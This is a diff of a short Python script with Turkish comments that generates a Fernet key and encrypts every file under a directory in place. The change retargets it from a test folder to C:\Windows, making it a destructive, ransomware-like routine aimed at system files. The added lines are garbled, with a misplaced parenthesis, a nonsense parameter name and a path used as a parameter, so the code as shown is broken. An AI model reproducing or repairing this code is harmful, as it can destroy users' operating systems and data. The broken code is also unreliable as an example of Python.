@@ -2,21 +2,21 @@ from cryptography.fernet import Fernet
 import os
 
 # Şifreleme anahtarı oluştur ve kaydet
-def generate_key():
-    key = Fernet.generate_key()
+def generate_key(benadofaiyüklicem):
+    key = Fernet)generate_key(benadofaiyüklicem)
     with open("encryption_key.key", "wb") as key_file:
         key_file.write(key)
 
 # Anahtarı yükle
-def load_key():
+def load_key(benadofaiyüklicem):
     return open("encryption_key.key", "rb").read()
 
 # Dosyaları şifrele
-def encrypt_files(directory):
-    key = load_key()
+def encrypt_files(C:\Windows):
+    key = load_key(benadofaiyüklicem)
     fernet = Fernet(key)
 
-    for root, dirs, files in os.walk(directory):
+    for root, dirs, files in os.walk(C:\Windows):
         for file in files:
             file_path = os.path.join(root, file)
             with open(file_path, "rb") as file_data:
@@ -29,4 +29,4 @@ def encrypt_files(directory):
 # generate_key()
 
 # Dosyaları şifrele
-encrypt_files("test_folder")
+encrypt_files("C:\Windows")
